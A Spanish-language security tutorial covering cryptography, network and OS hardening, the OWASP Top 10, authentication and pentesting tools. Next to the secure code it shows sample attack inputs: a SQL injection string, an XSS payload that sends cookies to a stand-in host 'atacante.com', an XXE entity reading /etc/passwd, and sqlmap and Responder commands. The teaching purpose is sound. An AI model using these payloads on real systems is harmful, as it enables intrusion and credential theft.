# 🔐 Tutorial Completo de Seguridad Informática

Este tutorial cubre los fundamentos de seguridad informática que todo estudiante de informática debe conocer para proteger sistemas, redes y datos.

---

## 📋 Tabla de Contenidos

1. [Fundamentos de Seguridad](#fundamentos-de-seguridad)
2. [Criptografía](#criptografía)
3. [Seguridad en Redes](#seguridad-en-redes)
4. [Seguridad Web - OWASP Top 10](#seguridad-web---owasp-top-10)
5. [Autenticación y Autorización](#autenticación-y-autorización)
6. [Hacking Ético y Pentesting](#hacking-ético-y-pentesting)
7. [Seguridad en Sistemas Operativos](#seguridad-en-sistemas-operativos)
8. [Malware y Protección](#malware-y-protección)
9. [Buenas Prácticas de Seguridad](#buenas-prácticas-de-seguridad)
10. [Ejercicios Prácticos](#ejercicios-prácticos)

---

## Fundamentos de Seguridad

### Triada CIA

Los tres pilares fundamentales de la seguridad de la información:

```
        ┌─────────────────────┐
        │  Confidencialidad   │
        │     (Secrecy)       │
        └──────────┬──────────┘
                   │
      ┌────────────┼────────────┐
      │            │            │
      ▼            │            ▼
┌───────────┐      │      ┌─────────────┐
│ Integridad│◄─────┴─────►│Disponibilidad│
│(Integrity)│             │(Availability)│
└───────────┘             └─────────────┘
```

| Principio | Descripción | Ejemplo |
|-----------|-------------|---------|
| **Confidencialidad** | Solo usuarios autorizados acceden a la información | Cifrado de datos |
| **Integridad** | Los datos no son alterados sin autorización | Firmas digitales |
| **Disponibilidad** | Los sistemas están accesibles cuando se necesitan | Redundancia, backups |

### Principios de Seguridad

- **Defensa en profundidad**: Múltiples capas de seguridad
- **Menor privilegio**: Solo los permisos necesarios
- **Separación de funciones**: División de responsabilidades
- **Seguridad por diseño**: Incorporar seguridad desde el inicio

### Tipos de Amenazas

| Tipo | Descripción | Ejemplos |
|------|-------------|----------|
| **Malware** | Software malicioso | Virus, ransomware, troyanos |
| **Phishing** | Ingeniería social | Emails fraudulentos |
| **DoS/DDoS** | Denegación de servicio | Ataques de saturación |
| **MITM** | Hombre en el medio | Interceptación de comunicaciones |
| **Insider Threat** | Amenaza interna | Empleados maliciosos |

---

## Criptografía

### Conceptos Básicos

```
Texto Plano → [Cifrado] → Texto Cifrado → [Descifrado] → Texto Plano
                  ↑                            ↑
                Clave                        Clave
```

### Cifrado Simétrico

La misma clave se usa para cifrar y descifrar.

**Algoritmos comunes:**
- **AES** (Advanced Encryption Standard) - Recomendado
- **DES** (Data Encryption Standard) - Obsoleto
- **3DES** (Triple DES) - En desuso
- **ChaCha20** - Moderno y rápido

```bash
# Ejemplo con OpenSSL - Cifrar archivo
openssl aes-256-cbc -salt -in archivo.txt -out archivo.enc -k password

# Descifrar archivo
openssl aes-256-cbc -d -in archivo.enc -out archivo.txt -k password
```

### Cifrado Asimétrico

Usa un par de claves: pública (para cifrar) y privada (para descifrar).

**Algoritmos comunes:**
- **RSA** - Más utilizado
- **ECDSA** - Curva elíptica, más eficiente
- **Ed25519** - Moderno, rápido

```bash
# Generar par de claves RSA
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Cifrar con clave pública
openssl rsautl -encrypt -inkey public.pem -pubin -in mensaje.txt -out mensaje.enc

# Descifrar con clave privada
openssl rsautl -decrypt -inkey private.pem -in mensaje.enc -out mensaje.txt
```

### Funciones Hash

Transforman datos de cualquier tamaño en una cadena de longitud fija.

| Algoritmo | Longitud | Estado |
|-----------|----------|--------|
| MD5 | 128 bits | ❌ Inseguro |
| SHA-1 | 160 bits | ❌ Inseguro |
| SHA-256 | 256 bits | ✅ Seguro |
| SHA-512 | 512 bits | ✅ Seguro |
| bcrypt | Variable | ✅ Para contraseñas |
| Argon2 | Variable | ✅ Para contraseñas (recomendado) |

```bash
# Calcular hash SHA-256
echo -n "texto" | sha256sum

# Calcular hash de un archivo
sha256sum archivo.txt

# Hash para contraseñas con OpenSSL
openssl passwd -6 "micontraseña"
```

### Firmas Digitales

```
                    Documento
                        │
                        ▼
┌─────────────────────────────────────┐
│           Hash del documento        │
└─────────────────────────────────────┘
                        │
                        ▼
                [Clave Privada]
                        │
                        ▼
┌─────────────────────────────────────┐
│           Firma Digital             │
└─────────────────────────────────────┘
```

```bash
# Firmar un documento
openssl dgst -sha256 -sign private.pem -out firma.sig documento.txt

# Verificar firma
openssl dgst -sha256 -verify public.pem -signature firma.sig documento.txt
```

### Certificados SSL/TLS

```bash
# Generar certificado autofirmado
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Ver información del certificado
openssl x509 -in cert.pem -text -noout

# Verificar certificado de un sitio web
openssl s_client -connect google.com:443 -servername google.com
```

---

## Seguridad en Redes

### Firewalls

```bash
# UFW (Uncomplicated Firewall) - Ubuntu/Debian
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw status

# iptables
sudo iptables -L                           # Listar reglas
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -j DROP
```

### Segmentación de Red

```
┌─────────────────────────────────────────────────────────────┐
│                        INTERNET                              │
└────────────────────────────┬────────────────────────────────┘
                             │
                     ┌───────┴───────┐
                     │   Firewall    │
                     └───────┬───────┘
                             │
         ┌───────────────────┼───────────────────┐
         │                   │                   │
    ┌────┴────┐        ┌─────┴─────┐       ┌─────┴─────┐
    │   DMZ   │        │  LAN Int. │       │ Servidores│
    │(Pública)│        │ (Oficina) │       │ (Backend) │
    └─────────┘        └───────────┘       └───────────┘
```

### VPN (Virtual Private Network)

```bash
# Configuración básica de WireGuard
# Servidor (/etc/wireguard/wg0.conf)
[Interface]
PrivateKey = SERVER_PRIVATE_KEY
Address = 10.0.0.1/24
ListenPort = 51820

[Peer]
PublicKey = CLIENT_PUBLIC_KEY
AllowedIPs = 10.0.0.2/32

# Cliente
[Interface]
PrivateKey = CLIENT_PRIVATE_KEY
Address = 10.0.0.2/24

[Peer]
PublicKey = SERVER_PUBLIC_KEY
Endpoint = servidor.com:51820
AllowedIPs = 0.0.0.0/0
```

### IDS/IPS

**Snort** - Sistema de Detección de Intrusos:

```bash
# Instalación básica
sudo apt install snort

# Ejecutar en modo de detección
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
```

---

## Seguridad Web - OWASP Top 10

### 1. Inyección SQL

**Vulnerable:**
```python
# ❌ MAL - Vulnerable a SQL Injection
query = f"SELECT * FROM users WHERE username = '{username}'"
```

**Seguro:**
```python
# ✅ BIEN - Consulta parametrizada
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```

**Ejemplo de ataque:**
```sql
-- Input malicioso
' OR '1'='1' --

-- Resultado de la consulta vulnerable
SELECT * FROM users WHERE username = '' OR '1'='1' --'
```

### 2. Cross-Site Scripting (XSS)

**Tipos de XSS:**
- **Reflected**: El script viene en la URL
- **Stored**: El script está guardado en la base de datos
- **DOM-based**: El script modifica el DOM

**Vulnerable:**
```html
<!-- ❌ MAL -->
<div>Hola, <?php echo $_GET['nombre']; ?></div>
```

**Seguro:**
```html
<!-- ✅ BIEN -->
<div>Hola, <?php echo htmlspecialchars($_GET['nombre'], ENT_QUOTES, 'UTF-8'); ?></div>
```

**Ejemplo de ataque:**
```html
<!-- Input malicioso -->
<script>document.location='http://atacante.com/robar.php?cookie='+document.cookie</script>
```

### 3. Autenticación Rota

**Problemas comunes:**
- Contraseñas débiles permitidas
- No implementar bloqueo después de intentos fallidos
- Tokens de sesión predecibles
- Exposición de credenciales en URLs

**Soluciones:**
```python
# Validar fortaleza de contraseña
import re

def validar_password(password):
    if len(password) < 12:
        return False
    if not re.search(r'[A-Z]', password):
        return False
    if not re.search(r'[a-z]', password):
        return False
    if not re.search(r'[0-9]', password):
        return False
    if not re.search(r'[!@#$%^&*]', password):
        return False
    return True
```

### 4. Exposición de Datos Sensibles

**Datos que deben protegerse:**
- Contraseñas (hashear con bcrypt/Argon2)
- Tarjetas de crédito
- Información personal (PII)
- Tokens y claves API

```python
# Hashear contraseñas correctamente
import bcrypt

# Crear hash
password = "micontraseña123"
salt = bcrypt.gensalt()
hashed = bcrypt.hashpw(password.encode(), salt)

# Verificar
bcrypt.checkpw(password.encode(), hashed)  # True
```

### 5. XML External Entities (XXE)

**Vulnerable:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**Solución:**
```python
# Python - Deshabilitar entidades externas
from lxml import etree

parser = etree.XMLParser(resolve_entities=False)
```

### 6. Control de Acceso Roto

```python
# ❌ MAL - Sin verificación de permisos
@app.route('/admin/users/<user_id>')
def get_user(user_id):
    return User.query.get(user_id)

# ✅ BIEN - Con verificación
@app.route('/admin/users/<user_id>')
@login_required
@admin_required
def get_user(user_id):
    return User.query.get(user_id)
```

### 7. Security Misconfiguration

**Checklist de configuración:**
- [ ] Deshabilitar listado de directorios
- [ ] Eliminar páginas de error detalladas en producción
- [ ] Actualizar software regularmente
- [ ] Cambiar credenciales por defecto
- [ ] Deshabilitar servicios innecesarios

```nginx
# Nginx - Ocultar versión
server_tokens off;

# Deshabilitar listado de directorios
autoindex off;
```

### 8. Cross-Site Request Forgery (CSRF)

**Protección:**
```html
<!-- Incluir token CSRF en formularios -->
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
    <input type="text" name="amount">
    <button type="submit">Transferir</button>
</form>
```

```python
# Flask - Protección CSRF
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)
```

### 9. Componentes con Vulnerabilidades Conocidas

```bash
# Verificar dependencias vulnerables

# Python
pip install safety
safety check

# JavaScript/Node.js
npm audit
npm audit fix

# Escanear con OWASP Dependency-Check
dependency-check --project "Mi Proyecto" --scan ./
```

### 10. Registro y Monitoreo Insuficientes

```python
import logging

# Configurar logging de seguridad
logging.basicConfig(
    filename='security.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def login(username, password):
    if authenticate(username, password):
        logging.info(f"Login exitoso: {username}")
        return True
    else:
        logging.warning(f"Intento de login fallido: {username}")
        return False
```

---

## Autenticación y Autorización

### Autenticación Multi-Factor (MFA)

**Factores de autenticación:**
1. **Algo que sabes**: Contraseña, PIN
2. **Algo que tienes**: Token físico, smartphone
3. **Algo que eres**: Huella dactilar, reconocimiento facial

### JWT (JSON Web Tokens)

```
┌────────────────────────────────────────────────────────────┐
│                         JWT                                 │
├──────────────┬──────────────────────┬──────────────────────┤
│   Header     │      Payload         │      Signature       │
│  (Base64)    │      (Base64)        │      (Base64)        │
└──────────────┴──────────────────────┴──────────────────────┘
```

```python
import jwt
from datetime import datetime, timedelta

# Crear token
payload = {
    'user_id': 123,
    'username': 'usuario',
    'exp': datetime.utcnow() + timedelta(hours=1)
}
token = jwt.encode(payload, 'secret_key', algorithm='HS256')

# Verificar token
try:
    decoded = jwt.decode(token, 'secret_key', algorithms=['HS256'])
except jwt.ExpiredSignatureError:
    print("Token expirado")
except jwt.InvalidTokenError:
    print("Token inválido")
```

### OAuth 2.0

```
┌────────────┐                              ┌────────────────┐
│   Usuario  │                              │  Proveedor     │
│            │                              │  (Google, etc) │
└─────┬──────┘                              └───────┬────────┘
      │                                             │
      │  1. Solicita acceso                         │
      ├────────────────────────────────────────────►│
      │                                             │
      │  2. Redirige a página de login              │
      │◄────────────────────────────────────────────┤
      │                                             │
      │  3. Usuario se autentica                    │
      ├────────────────────────────────────────────►│
      │                                             │
      │  4. Código de autorización                  │
      │◄────────────────────────────────────────────┤
      │                                             │
┌─────┴──────┐                                      │
│ Aplicación │  5. Intercambia código por token    │
│            ├─────────────────────────────────────►│
│            │  6. Access Token + Refresh Token    │
│            │◄─────────────────────────────────────┤
└────────────┘                                      │
```

### RBAC (Control de Acceso Basado en Roles)

```python
# Definición de roles y permisos
ROLES = {
    'admin': ['read', 'write', 'delete', 'manage_users'],
    'editor': ['read', 'write'],
    'viewer': ['read']
}

def check_permission(user_role, required_permission):
    return required_permission in ROLES.get(user_role, [])

# Decorador de permisos
def requires_permission(permission):
    def decorator(func):
        def wrapper(*args, **kwargs):
            if check_permission(current_user.role, permission):
                return func(*args, **kwargs)
            raise PermissionError("Acceso denegado")
        return wrapper
    return decorator

@requires_permission('delete')
def delete_user(user_id):
    # Solo administradores pueden eliminar
    pass
```

---

## Hacking Ético y Pentesting

### Fases del Pentesting

1. **Reconocimiento** (Recon)
2. **Escaneo**
3. **Explotación**
4. **Post-explotación**
5. **Informe**

### Herramientas Esenciales

#### Reconocimiento

```bash
# WHOIS
whois ejemplo.com

# DNS enumeration
dig ejemplo.com ANY
dnsrecon -d ejemplo.com

# Subdomain enumeration
sublist3r -d ejemplo.com
amass enum -d ejemplo.com

# Búsqueda de información pública
theHarvester -d ejemplo.com -b google
```

#### Escaneo de Puertos

```bash
# Nmap - Escaneo básico
nmap -sV ejemplo.com

# Escaneo completo
nmap -sS -sV -sC -O -p- ejemplo.com

# Escaneo sigiloso
nmap -sS -T2 ejemplo.com

# Scripts de vulnerabilidades
nmap --script vuln ejemplo.com
```

#### Análisis de Vulnerabilidades

```bash
# Nikto - Escaneo web
nikto -h http://ejemplo.com

# WPScan - WordPress
wpscan --url http://ejemplo.com

# SQLMap - Inyección SQL
sqlmap -u "http://ejemplo.com/page?id=1" --dbs

# Burp Suite - Proxy de interceptación
# (Herramienta gráfica)
```

#### Análisis de Red

```bash
# Wireshark - Captura de paquetes
wireshark

# tcpdump - Captura en terminal
sudo tcpdump -i eth0 port 80

# Responder - Captura de credenciales en red local
sudo responder -I eth0
```

### Metodologías

- **OWASP Testing Guide**: Para aplicaciones web
- **PTES**: Penetration Testing Execution Standard
- **OSSTMM**: Open Source Security Testing Methodology Manual

---

## Seguridad en Sistemas Operativos

### Linux Hardening

```bash
# Actualizar el sistema
sudo apt update && sudo apt upgrade -y

# Deshabilitar root SSH
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no

# Configurar fail2ban
sudo apt install fail2ban
sudo systemctl enable fail2ban

# Configurar auditoría
sudo apt install auditd
sudo auditctl -w /etc/passwd -p wa -k passwd_changes

# Deshabilitar servicios innecesarios
sudo systemctl disable bluetooth
sudo systemctl disable cups
```

### Permisos y Privilegios

```bash
# Permisos de archivos seguros
chmod 600 ~/.ssh/id_rsa          # Solo propietario
chmod 644 ~/.ssh/id_rsa.pub      # Lectura pública
chmod 700 ~/.ssh                  # Solo propietario

# Archivos con SUID/SGID
find / -perm -4000 2>/dev/null   # Archivos SUID
find / -perm -2000 2>/dev/null   # Archivos SGID

# Eliminar permisos SUID innecesarios
sudo chmod u-s /path/to/binary
```

### SELinux y AppArmor

```bash
# SELinux (CentOS/RHEL)
getenforce                        # Ver estado
sudo setenforce 1                 # Activar
sudo setenforce 0                 # Modo permisivo

# AppArmor (Ubuntu/Debian)
sudo aa-status                    # Ver estado
sudo aa-enforce /etc/apparmor.d/* # Activar perfiles
```

---

## Malware y Protección

### Tipos de Malware

| Tipo | Descripción | Propagación |
|------|-------------|-------------|
| **Virus** | Se adjunta a programas | Ejecución de archivos |
| **Gusano** | Se replica automáticamente | Red |
| **Troyano** | Simula ser legítimo | Descarga del usuario |
| **Ransomware** | Cifra archivos, pide rescate | Phishing, exploits |
| **Spyware** | Espía actividad del usuario | Instalación oculta |
| **Rootkit** | Oculta presencia en sistema | Exploits, escalación |

### Análisis de Malware (Básico)

```bash
# Análisis estático
file suspicious_file
strings suspicious_file
hexdump -C suspicious_file | head

# Calcular hashes
md5sum suspicious_file
sha256sum suspicious_file

# Buscar hash en VirusTotal
# https://www.virustotal.com

# Análisis de PE (Windows)
# pestudio, PEiD

# Análisis dinámico (en sandbox)
# ANY.RUN, Cuckoo Sandbox
```

### Detección y Prevención

```bash
# ClamAV - Antivirus Linux
sudo apt install clamav
sudo freshclam                    # Actualizar firmas
clamscan -r /home                 # Escanear directorio

# YARA - Detección de malware
yara rules.yar suspicious_file

# rkhunter - Detector de rootkits
sudo apt install rkhunter
sudo rkhunter --check
```

---

## Buenas Prácticas de Seguridad

### Gestión de Contraseñas

- ✅ Usar contraseñas únicas para cada servicio
- ✅ Mínimo 12 caracteres con mayúsculas, minúsculas, números y símbolos
- ✅ Usar un gestor de contraseñas (Bitwarden, KeePass)
- ✅ Activar MFA siempre que sea posible
- ❌ No reutilizar contraseñas
- ❌ No almacenar contraseñas en texto plano

### Desarrollo Seguro (SDLC)

1. **Requisitos**: Definir requisitos de seguridad
2. **Diseño**: Modelado de amenazas (STRIDE)
3. **Implementación**: Revisión de código, SAST
4. **Pruebas**: Pentesting, DAST
5. **Despliegue**: Configuración segura
6. **Mantenimiento**: Parches, monitoreo

### Backup y Recuperación

```bash
# Backup con rsync
rsync -avz --backup /datos/ /backup/

# Backup cifrado con GPG
tar czf - /datos | gpg -c > backup.tar.gz.gpg

# Estrategia 3-2-1
# 3 copias de datos
# 2 tipos de almacenamiento diferentes
# 1 copia offsite
```

### Headers de Seguridad HTTP

```nginx
# Nginx - Headers de seguridad
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

---

## Ejercicios Prácticos

### Ejercicio 1: Configurar un servidor seguro

1. Instala un servidor Linux
2. Configura SSH con claves
3. Implementa fail2ban
4. Configura el firewall (UFW)
5. Habilita auditoría del sistema

### Ejercicio 2: Análisis de vulnerabilidades web

1. Configura OWASP WebGoat o DVWA
2. Identifica y explota vulnerabilidades SQL Injection
3. Identifica y explota vulnerabilidades XSS
4. Documenta los hallazgos

### Ejercicio 3: Criptografía práctica

1. Genera un par de claves RSA
2. Cifra y descifra un mensaje
3. Crea y verifica una firma digital
4. Genera un certificado SSL autofirmado

### Ejercicio 4: Pentesting básico

1. Configura Kali Linux
2. Realiza reconocimiento de un objetivo (CTF)
3. Escanea puertos con Nmap
4. Identifica vulnerabilidades
5. Documenta en formato de informe

### Ejercicio 5: Respuesta a incidentes

1. Simula un ataque de ransomware (entorno controlado)
2. Identifica indicadores de compromiso (IoC)
3. Contiene y erradica la amenaza
4. Recupera sistemas desde backup
5. Documenta lecciones aprendidas

---

## 📚 Recursos Adicionales

### Plataformas de Práctica

- [HackTheBox](https://www.hackthebox.eu/) - CTF y laboratorios
- [TryHackMe](https://tryhackme.com/) - Aprendizaje guiado
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Seguridad web
- [PentesterLab](https://pentesterlab.com/) - Ejercicios prácticos
- [OverTheWire](https://overthewire.org/) - Wargames

### Documentación Oficial

- [OWASP](https://owasp.org/) - Open Web Application Security Project
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/)
- [MITRE ATT&CK](https://attack.mitre.org/)

### Certificaciones Recomendadas

| Certificación | Nivel | Enfoque |
|---------------|-------|---------|
| CompTIA Security+ | Inicial | Fundamentos |
| CEH | Intermedio | Hacking ético |
| OSCP | Avanzado | Pentesting práctico |
| CISSP | Avanzado | Gestión de seguridad |
| eJPT | Inicial | Pentesting |

### Libros Recomendados

- "The Web Application Hacker's Handbook"
- "Hacking: The Art of Exploitation"
- "Practical Malware Analysis"
- "Applied Cryptography" - Bruce Schneier

---

## 🎯 Siguiente Paso

¡Continúa practicando! La seguridad informática requiere aprendizaje continuo. Participa en CTFs, sigue las últimas vulnerabilidades y mantente actualizado con las tendencias de seguridad.

**Recuerda**: Solo realiza pruebas de seguridad en sistemas para los que tengas autorización explícita.
